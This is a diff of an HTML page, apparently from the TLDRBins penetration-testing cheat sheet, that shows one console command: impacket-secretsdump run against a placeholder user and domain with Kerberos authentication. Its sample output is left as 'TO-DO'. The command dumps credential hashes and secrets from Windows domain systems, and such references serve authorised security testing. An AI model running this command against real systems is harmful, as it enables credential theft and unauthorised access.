+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump '<span class="o">&lt;USER&gt;</span>@<span class="o">&lt;TARGET_DOMAIN&gt;</span>' -k -no-pass
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div></div></div><p></p>
 
-</div></div>
-    
-    <script type="module" src="/js/main.js"></script>
-    <footer>
-    <hr>
-    <div class="footer-text">
-        <div>© 2025 TLDRBins</div>
-    </div>
+</div>
+</main>
+<script type="module" src="/js/main.js"></script>
+<footer>
+  <hr>
+  <div>© 2025 TLDRBins</div>
 </footer>
-</body>
-</html>
+
+
+</body></html>
